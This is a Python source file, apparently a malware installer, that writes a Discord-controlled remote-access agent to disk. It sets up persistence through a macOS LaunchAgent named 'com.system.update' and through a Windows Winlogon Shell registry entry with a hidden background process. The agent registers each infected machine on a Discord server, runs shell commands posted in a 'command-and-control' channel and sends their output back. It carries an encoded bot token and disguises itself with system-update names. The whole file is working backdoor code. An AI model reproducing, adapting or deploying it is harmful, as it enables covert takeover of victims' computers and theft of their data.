import sys
import os
import platform
import uuid
import hashlib
import shutil
import subprocess
from datetime import datetime

# Debug log
def get_debug_log_path():
    """Platforma görə debug log yolu"""
    if platform.system() == 'Windows':
        return 'C:\\Windows\\Temp\\hooktest_persistence.log'
    else:
        return '/tmp/hooktest_persistence.log'

DEBUG_LOG = get_debug_log_path()

def log_debug(message):
    """Debug mesajı yaz"""
    try:
        with open(DEBUG_LOG, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def find_python_executable():
    """Python executable'ı tap"""
    python_exe = sys.executable
    if os.path.exists(python_exe):
        log_debug(f"Using Python: {python_exe}")
        return python_exe
    
    # Fallback axtarışları
    if platform.system() == "Windows":
        for cmd in ["python", "python3"]:
            exe = shutil.which(cmd)
            if exe:
                log_debug(f"Found Python: {exe}")
                return exe
    else:
        for cmd in ["python3", "python"]:
            exe = shutil.which(cmd)
            if exe:
                log_debug(f"Found Python: {exe}")
                return exe
    
    log_debug(f"Using fallback: {sys.executable}")
    return sys.executable

def generate_session_id():
    """Session ID yarad"""
    system_info = (
        platform.system() +
        platform.node() +
        platform.machine() +
        str(uuid.getnode())
    )
    hashed = hashlib.sha256(system_info.encode()).hexdigest()
    return "session_" + hashed

def create_discord_agent_script():
    """Discord agent script yarat - bütün dependency yükləmə ilə"""
    
    # Platforma görə log yolu
    if platform.system() == "Windows":
        log_path = 'C:\\\\Windows\\\\Temp\\\\discord_agent_runtime.log'
    else:
        log_path = '/tmp/discord_agent_runtime.log'
    
    session_id = generate_session_id()
    
    agent_code = f'''#!/usr/bin/env python3
import sys
import subprocess
import importlib.util
import os
import asyncio
import platform
import uuid
import hashlib
import re
import base64
from datetime import datetime
import time
import site
import shutil

# Debug log
DEBUG_LOG = '{log_path}'

def log_debug(message):
    """Debug mesajı yaz"""
    try:
        with open(DEBUG_LOG, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{{timestamp}}] {{message}}\\n")
    except:
        pass

# Discord Agent Globals
SESSION_ID = "{session_id}"
CLIENT_INFO = f"{{platform.system()}} {{platform.release()}} - {{platform.node()}}"
COMMAND_AND_CONTROL_CHANNEL = None
GET_COMMANDS_CHANNEL = None
COMMAND_RESULTS_CHANNEL = None
last_processed_message_id = None

# Required packages
REQUIRED_PACKAGES = {{
    "discord": "discord.py",
    "aiohttp": "aiohttp",
    "aiodns": "aiodns",
}}

def is_venv_active():
    """Virtual environment kontrolü"""
    return (hasattr(sys, 'real_prefix') or 
            (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

def find_python_executable():
    """Python executable tap"""
    python_exe = sys.executable
    if os.path.exists(python_exe):
        return python_exe
    
    if platform.system() == "Windows":
        for cmd in ["python", "python3"]:
            exe = shutil.which(cmd)
            if exe:
                return exe
    else:
        for cmd in ["python3", "python"]:
            exe = shutil.which(cmd)
            if exe:
                return exe
    
    return sys.executable

def find_working_pip():
    """Çalışan pip tap"""
    python_exe = find_python_executable()
    
    # Windows üçün Scripts/pip.exe
    if platform.system() == "Windows":
        python_dir = os.path.dirname(python_exe)
        scripts_dir = os.path.join(python_dir, "Scripts")
        
        windows_pips = [
            os.path.join(scripts_dir, "pip.exe"),
            os.path.join(scripts_dir, "pip3.exe"),
        ]
        
        for pip_path in windows_pips:
            if os.path.exists(pip_path):
                try:
                    result = subprocess.run(
                        [pip_path, "--version"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=5
                    )
                    if result.returncode == 0:
                        return [pip_path]
                except:
                    pass
    
    # python -m pip
    test_cmds = [
        [python_exe, "-m", "pip"],
        [python_exe, "-m", "pip3"],
    ]
    
    for cmd in test_cmds:
        try:
            result = subprocess.run(
                cmd + ["--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            if result.returncode == 0:
                return cmd
        except:
            pass
    
    # Direct pip command
    for pip_cmd in ["pip3", "pip"]:
        try:
            result = subprocess.run(
                [pip_cmd, "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            if result.returncode == 0:
                return [pip_cmd]
        except:
            pass
    
    return None

def get_user_site_packages():
    """User site-packages dizinini tap"""
    try:
        user_site = site.getusersitepackages()
        return user_site
    except:
        home = os.path.expanduser("~")
        if platform.system() == "Windows":
            major, minor = sys.version_info.major, sys.version_info.minor
            return os.path.join(home, "AppData", "Roaming", "Python", 
                              f"Python{{major}}{{minor}}", "site-packages")
        else:
            return os.path.join(home, ".local", "lib", 
                              f"python{{sys.version_info.major}}.{{sys.version_info.minor}}", 
                              "site-packages")

def ensure_user_site_exists():
    """User site-packages yarat"""
    user_site = get_user_site_packages()
    if not os.path.exists(user_site):
        try:
            os.makedirs(user_site, exist_ok=True)
            log_debug(f"Created user site: {{user_site}}")
        except Exception as e:
            log_debug(f"Failed to create user site: {{e}}")
    return user_site

def install_package(module_name, package_name):
    """Paketi yüklə"""
    log_debug(f"Installing {{package_name}}...")
    
    pip_cmd = find_working_pip()
    if not pip_cmd:
        log_debug("No pip found")
        return False
    
    user_site = ensure_user_site_exists()
    
    strategies = [
        pip_cmd + ["install", package_name, "--user"],
        pip_cmd + ["install", package_name, "--user", "--no-cache-dir"],
        pip_cmd + ["install", package_name, "--target", user_site],
    ]
    
    for strategy in strategies:
        try:
            result = subprocess.run(
                strategy,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=180,
                shell=(platform.system() == "Windows")
            )
            
            if result.returncode == 0 or b"Successfully installed" in result.stdout:
                log_debug(f"Installed {{package_name}}")
                time.sleep(2)
                return True
        except:
            pass
    
    log_debug(f"Failed to install {{package_name}}")
    return False

def add_all_paths_to_sys():
    """sys.path'ə paket yollarını əlavə et"""
    paths_to_add = []
    
    try:
        user_site = site.getusersitepackages()
        if user_site:
            paths_to_add.append(user_site)
    except:
        pass
    
    try:
        for site_path in site.getsitepackages():
            paths_to_add.append(site_path)
    except:
        pass
    
    for path in paths_to_add:
        if os.path.isdir(path) and path not in sys.path:
            sys.path.insert(0, path)
    
    importlib.invalidate_caches()

def check_and_install_packages():
    """Paketləri yoxla və yüklə - agent runtime zamanı"""
    log_debug("=== CHECKING PACKAGES (Runtime) ===")
    
    try:
        add_all_paths_to_sys()
        
        missing = []
        for module_name, package_name in REQUIRED_PACKAGES.items():
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                missing.append((module_name, package_name))
                log_debug(f"Missing: {{package_name}}")
        
        if not missing:
            log_debug("All packages present")
            return True
        
        # Paketləri yüklə
        for module_name, package_name in missing:
            install_package(module_name, package_name)
        
        # Verify
        add_all_paths_to_sys()
        time.sleep(2)
        
        still_missing = []
        for module_name, package_name in missing:
            spec = importlib.util.find_spec(module_name)
            if spec is None:
                still_missing.append(package_name)
        
        return len(still_missing) == 0
        
    except Exception as e:
        log_debug(f"Package check error: {{e}}")
        return False

def import_discord_modules():
    """Discord modülləri import et"""
    try:
        global discord, aiohttp
        
        add_all_paths_to_sys()
        
        import discord
        import aiohttp
        
        log_debug("Discord modules imported")
        return True
        
    except ImportError as e:
        log_debug(f"Import error: {{e}}")
        return False

async def create_client():
    """Discord client yarat"""
    try:
        connector = aiohttp.TCPConnector(family=0, ssl=False)
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        client = discord.Client(intents=intents, connector=connector)
        return client
    except Exception as e:
        log_debug(f"Client creation failed: {{e}}")
        return None

async def register_session(guild, client_instance):
    """Session qeydiyyat"""
    try:
        channel = guild.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(f'/register {{SESSION_ID}} {{CLIENT_INFO}}')
            log_debug("Registered")
    except Exception as e:
        log_debug(f"Registration failed: {{e}}")

def parse_command_message(content):
    """Komanda mesajını parse et"""
    try:
        lines = content.split('\\n')
        command_id = None
        session = None
        command = None
        
        for line in lines:
            if 'Command ID:' in line:
                command_id = line.split('Command ID:')[1].strip()
            elif 'Session:' in line:
                m = re.search(r"session_[0-9a-fA-F]{{64}}", line)
                session = m.group(0) if m else None
            elif 'Command:' in line:
                match = re.search(r"```(.*?)```", content, re.DOTALL)
                if match:
                    command = match.group(1).strip()
        
        if command_id and session and command:
            return {{
                'command_id': command_id,
                'session': session,
                'command': command
            }}
        return None
    except:
        return None

async def execute_command(command):
    """Sistem komandası icra et"""
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            executable='/bin/bash' if platform.system() != 'Windows' else None
        )
        
        stdout, stderr = process.communicate(timeout=30)
        
        if process.returncode == 0:
            result = stdout if stdout else 'Success'
        else:
            result = f'Error: {{stderr if stderr else "Failed"}}'
        
        if len(result) > 1900:
            result = result[:1900] + '\\n...(truncated)'
        
        return result
        
    except subprocess.TimeoutExpired:
        return 'Error: Timeout'
    except Exception as e:
        return f'Error: {{str(e)}}'

async def send_response(command_id, command, response, client_instance):
    """Cavab göndər"""
    try:
        channel = client_instance.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(
                f'**Response for {{command_id}}**\\n'
                f'**Session:** {{SESSION_ID}}\\n'
                f'**Command:** ```{{command[:100]}}```\\n'
                f'**Response:** ```{{response}}```'
            )
        
        results_channel = client_instance.get_channel(COMMAND_RESULTS_CHANNEL)
        if results_channel:
            await results_channel.send(
                f'**Command ID:** {{command_id}}\\n'
                f'**Session:** {{SESSION_ID}}\\n'
                f'**Command:** ```{{command}}```\\n'
                f'**Response:** ```{{response}}```\\n'
                f'**Timestamp:** {{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}}'
            )
            
    except Exception as e:
        log_debug(f"Failed to send response: {{e}}")

async def poll_commands(client_instance):
    """Komandaları poll et"""
    global last_processed_message_id
    
    try:
        log_debug("Polling started")
        await asyncio.sleep(5)
        
        while True:
            try:
                channel = client_instance.get_channel(GET_COMMANDS_CHANNEL)
                if not channel:
                    await asyncio.sleep(10)
                    continue
                
                messages = [msg async for msg in channel.history(limit=1)]
                
                if messages:
                    latest_message = messages[0]
                    
                    if last_processed_message_id != latest_message.id:
                        command_data = parse_command_message(latest_message.content)
                        
                        if command_data and command_data["session"] == SESSION_ID:
                            response = await execute_command(command_data['command'])
                            await send_response(
                                command_data['command_id'],
                                command_data['command'],
                                response,
                                client_instance
                            )
                            last_processed_message_id = latest_message.id
                
                await asyncio.sleep(3)
                
            except Exception as e:
                log_debug(f"Poll error: {{e}}")
                await asyncio.sleep(10)
                
    except Exception as e:
        log_debug(f"Fatal poll error: {{e}}")

async def setup_client_events(client_instance):
    """Event handler qur"""
    global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
    
    @client_instance.event
    async def on_ready():
        global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
        
        try:
            log_debug(f"Connected as {{client_instance.user.name}}")
            
            guild = client_instance.guilds[0] if client_instance.guilds else None
            if guild:
                for channel in guild.text_channels:
                    if channel.name == 'command-and-control':
                        COMMAND_AND_CONTROL_CHANNEL = channel.id
                    elif channel.name == 'get-commands':
                        GET_COMMANDS_CHANNEL = channel.id
                    elif channel.name == 'command-results':
                        COMMAND_RESULTS_CHANNEL = channel.id
                
                if all([COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL]):
                    await register_session(guild, client_instance)
                    client_instance.loop.create_task(poll_commands(client_instance))
                
        except Exception as e:
            log_debug(f"on_ready error: {{e}}")

async def run_discord_client():
    """Discord client işə sal"""
    try:
        log_debug("=== DISCORD AGENT STARTING ===")
        
        # Dependency yüklə - RUNTIME zamanı
        if not check_and_install_packages():
            log_debug("Failed to install dependencies")
            return
        
        # Modülləri import et
        if not import_discord_modules():
            log_debug("Cannot import Discord modules")
            return
        
        TOKEN = base64.b64decode(
            "TVRRek5UazBPVGcwTURjeE56VTRNalE0T1EuR3F4OW11LnRHeno5alVEZTVGeGhJc19Oa0h2MFA5WmxpT2o3X1o0LVVOdXF3"
        ).decode('utf-8')
        
        client = await create_client()
        if not client:
            log_debug("Cannot create client")
            return
        
        await setup_client_events(client)
        await client.start(TOKEN)
        
    except Exception as e:
        log_debug(f"Fatal error: {{e}}")
        import traceback
        log_debug(traceback.format_exc())

def start_discord_agent():
    """Entry point"""
    try:
        log_debug("=== AGENT START ===")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_discord_client())
    except Exception as e:
        log_debug(f"Error: {{e}}")

if __name__ == "__main__":
    start_discord_agent()
'''
    
    return agent_code

# ============================================================================
# MACOS PERSISTENCE - SADECE PERSISTENCE
# ============================================================================

def create_launch_agent():
    """LaunchAgent yarat və qur"""
    log_debug("=== CREATING LAUNCH AGENT ===")
    
    home = os.path.expanduser("~")
    launch_agents_dir = os.path.join(home, "Library", "LaunchAgents")
    agent_script_path = os.path.join(home, ".local", "bin", "discord_agent.py")
    plist_path = os.path.join(launch_agents_dir, "com.system.update.plist")
    
    # Dizinlər
    os.makedirs(launch_agents_dir, exist_ok=True)
    os.makedirs(os.path.dirname(agent_script_path), exist_ok=True)
    
    # Agent script
    agent_code = create_discord_agent_script()
    with open(agent_script_path, 'w', encoding='utf-8') as f:
        f.write(agent_code)
    
    os.chmod(agent_script_path, 0o755)
    log_debug(f"Agent script: {agent_script_path}")
    
    # Python path
    python_exe = find_python_executable()
    
    # Plist
    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    
    <key>ProgramArguments</key>
    <array>
        <string>{python_exe}</string>
        <string>{agent_script_path}</string>
    </array>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>StartInterval</key>
    <integer>21600</integer>
    
    <key>StandardOutPath</key>
    <string>/tmp/discord_agent_out.log</string>
    
    <key>StandardErrorPath</key>
    <string>/tmp/discord_agent_err.log</string>
    
    <key>KeepAlive</key>
    <dict>
        <key>NetworkState</key>
        <true/>
    </dict>
</dict>
</plist>
'''
    
    with open(plist_path, 'w', encoding='utf-8') as f:
        f.write(plist_content)
    
    log_debug(f"Plist: {plist_path}")
    
    # Load agent
    try:
        subprocess.run(["launchctl", "unload", plist_path], 
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
    except:
        pass
    
    try:
        subprocess.run(["launchctl", "load", plist_path],
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        log_debug("LaunchAgent loaded")
    except Exception as e:
        log_debug(f"Load failed: {e}")
    
    try:
        subprocess.run(["launchctl", "start", "com.system.update"],
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        log_debug("Agent started")
    except Exception as e:
        log_debug(f"Start failed: {e}")

def setup_macos_persistence():
    """macOS persistence qur - SADECE PERSISTENCE"""
    try:
        log_debug("=== MACOS PERSISTENCE SETUP ===")
        
        if platform.system() != "Darwin":
            log_debug("Not macOS")
            return
        
        # Sadəcə persistence qur
        create_launch_agent()
        
        log_debug("=== MACOS PERSISTENCE DONE ===")
        
    except Exception as e:
        log_debug(f"Setup failed: {e}")

# ============================================================================
# WINDOWS PERSISTENCE - SADECE PERSISTENCE
# ============================================================================

def setup_winlogon_persistence():
    """Windows Winlogon persistence"""
    log_debug("=== WINDOWS WINLOGON PERSISTENCE ===")
    
    try:
        import winreg
    except ImportError:
        log_debug("winreg not available")
        return False
    
    home = os.path.expanduser("~")
    runner_folder = os.path.join(home, "AppData", "Local", "SystemUpdate")
    runner_path = os.path.join(runner_folder, "runner.py")
    
    os.makedirs(runner_folder, exist_ok=True)
    
    # Runner script
    agent_code = create_discord_agent_script()
    with open(runner_path, 'w', encoding='utf-8') as f:
        f.write(agent_code)
    
    log_debug(f"Runner: {runner_path}")
    
    # Python path
    python_path = find_python_executable()
    pythonw_path = python_path.replace("python.exe", "pythonw.exe")
    
    if not os.path.exists(pythonw_path):
        pythonw_path = python_path
    
    command = f'"{pythonw_path}" "{runner_path}"'
    
    # Registry - Winlogon Shell
    key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
    
    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                               winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                               winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE)
        
        try:
            original_shell, _ = winreg.QueryValueEx(key, "Shell")
        except FileNotFoundError:
            original_shell = "explorer.exe"
        
        new_shell = f"{original_shell},{command}"
        
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, new_shell)
        winreg.CloseKey(key)
        
        log_debug("Winlogon Shell persistence installed")
        
    except Exception as e:
        log_debug(f"Registry Shell error: {e}")
    
    # Dərhal arxa planda işə sal
    try:
        log_debug("Starting runner.py immediately in background...")
        
        # CREATE_NO_WINDOW flag
        CREATE_NO_WINDOW = 0x08000000
        DETACHED_PROCESS = 0x00000008
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        subprocess.Popen(
            [pythonw_path, runner_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
            startupinfo=startupinfo,
            close_fds=True
        )
        
        log_debug("Runner.py started in background successfully")
        
    except Exception as e:
        log_debug(f"Failed to start runner immediately: {e}")
    
    return True

def setup_win_persistence():
    """Windows persistence qur - SADECE PERSISTENCE"""
    try:
        log_debug("=== WINDOWS PERSISTENCE SETUP ===")
        
        if platform.system() != "Windows":
            log_debug("Not Windows")
            return
        
        # Sadəcə persistence qur
        setup_winlogon_persistence()
        
        log_debug("=== WINDOWS PERSISTENCE DONE ===")
        
    except Exception as e:
        log_debug(f"Setup failed: {e}")

if __name__ == "__main__":
    if platform.system() == "Darwin":
        setup_macos_persistence()
    elif platform.system() == "Windows":
        setup_win_persistence()